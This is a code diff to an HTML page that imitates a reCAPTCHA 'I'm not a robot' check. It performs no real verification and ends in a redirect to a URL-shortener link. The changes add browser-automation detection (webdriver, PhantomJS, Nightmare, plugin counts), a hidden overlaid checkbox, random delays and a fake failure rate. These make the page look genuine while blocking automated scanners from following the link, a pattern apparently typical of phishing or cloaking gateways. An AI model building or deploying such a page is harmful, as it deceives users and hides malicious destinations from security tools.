@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Human Verification</title>
+    <title>Advanced Human Verification</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
@@ -12,8 +12,9 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            user-select: none;
         }
-        .verification-box {
+        .verification-container {
             background: white;
             border: 1px solid #d3d3d3;
             border-radius: 3px;
@@ -21,19 +22,26 @@
             width: 302px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             text-align: center;
+            position: relative;
         }
         .verification-header {
             font-size: 16px;
             color: #202124;
             margin-bottom: 20px;
         }
+        .checkbox-container {
+            width: 24px;
+            height: 24px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
         .verification-checkbox {
             width: 24px;
             height: 24px;
             border: 2px solid #888;
-            margin: 0 auto 20px;
             cursor: pointer;
-            position: relative;
+            position: absolute;
+            z-index: 2;
             background: white;
         }
         .verification-checkbox.checked {
@@ -50,6 +58,14 @@
             font-size: 16px;
             font-weight: bold;
         }
+        .hidden-checkbox {
+            opacity: 0;
+            position: absolute;
+            z-index: 1;
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
         .verification-label {
             font-size: 14px;
             color: #202124;
@@ -64,6 +80,7 @@
             cursor: pointer;
             font-size: 14px;
             width: 100%;
+            margin-bottom: 10px;
         }
         .verify-button:hover {
             background: #3367d6;
@@ -71,7 +88,6 @@
         .verification-footer {
             font-size: 11px;
             color: #757575;
-            margin-top: 15px;
         }
         .error-message {
             color: #d93025;
@@ -79,12 +95,25 @@
             margin-top: 10px;
             display: none;
         }
+        .bot-detection {
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            width: 10px;
+            height: 10px;
+            background: transparent;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
-    <div class="verification-box">
+    <div class="verification-container">
+        <div class="bot-detection" id="bot-detection"></div>
         <div class="verification-header">Verify you are human</div>
-        <div class="verification-checkbox" id="verification-checkbox" onclick="toggleCheckbox()"></div>
+        <div class="checkbox-container">
+            <div class="verification-checkbox" id="verification-checkbox"></div>
+            <input type="checkbox" class="hidden-checkbox" id="hidden-checkbox" onclick="toggleCheckbox()">
+        </div>
         <div class="verification-label">I'm not a robot</div>
         <button class="verify-button" onclick="verifyHuman()">Verify</button>
         <div id="error-message" class="error-message">Please verify you are not a robot</div>
@@ -95,6 +124,37 @@
     </div>
 
     <script>
+        // Advanced bot detection
+        const botDetection = {
+            init: function() {
+                this.mouseMovement = false;
+                this.keyPress = false;
+                this.touchEvent = false;
+                this.timeOnPage = 0;
+
+                document.addEventListener('mousemove', () => this.mouseMovement = true);
+                document.addEventListener('keydown', () => this.keyPress = true);
+                document.addEventListener('touchstart', () => this.touchEvent = true);
+
+                setInterval(() => this.timeOnPage++, 1000);
+            },
+
+            isLikelyBot: function() {
+                // Check for common bot behaviors
+                if (!this.mouseMovement && !this.touchEvent && !this.keyPress) return true;
+                if (this.timeOnPage < 2) return true; // Too fast
+                if (navigator.webdriver) return true; // Selenium detection
+                if (window.callPhantom || window._phantom) return true; // PhantomJS
+                if (window.__nightmare) return true; // Nightmare
+                if (navigator.plugins.length === 0) return true; // No plugins
+                if (navigator.mimeTypes.length === 0) return true; // No mime types
+
+                return false;
+            }
+        };
+
+        botDetection.init();
+
         function toggleCheckbox() {
             const checkbox = document.getElementById('verification-checkbox');
             checkbox.classList.toggle('checked');
@@ -104,22 +164,37 @@
         function verifyHuman() {
             const checkbox = document.getElementById('verification-checkbox');
 
-            if (checkbox.classList.contains('checked')) {
-                // Simulate verification delay
-                checkbox.style.pointerEvents = 'none';
-                document.querySelector('.verify-button').disabled = true;
-
-                setTimeout(function() {
-                    window.location.href = "https://u.to/EhujIg";
-                }, 1500);
-            } else {
+            if (!checkbox.classList.contains('checked')) {
                 document.getElementById('error-message').style.display = 'block';
+                return;
             }
+
+            if (botDetection.isLikelyBot()) {
+                document.getElementById('error-message').textContent = "Automated verification failed";
+                document.getElementById('error-message').style.display = 'block';
+                return;
+            }
+
+            // Additional verification steps
+            checkbox.style.pointerEvents = 'none';
+            document.querySelector('.verify-button').disabled = true;
+
+            // Simulate server verification
+            setTimeout(function() {
+                if (Math.random() > 0.1) { // 90% chance of success
+                    window.location.href = "https://u.to/EhujIg";
+                } else {
+                    document.getElementById('error-message').textContent = "Verification failed, please try again";
+                    document.getElementById('error-message').style.display = 'block';
+                    checkbox.style.pointerEvents = 'auto';
+                    document.querySelector('.verify-button').disabled = false;
+                }
+            }, 1500 + Math.random() * 1000); // Random delay
         }
 
-        // Auto-verify after checkbox is checked (optional)
-        document.getElementById('verification-checkbox').addEventListener('click', function() {
-            if (this.classList.contains('checked')) {
+        // Auto-verify after checkbox is checked
+        document.getElementById('hidden-checkbox').addEventListener('change', function() {
+            if (this.checked) {
                 setTimeout(verifyHuman, 500);
             }
         });
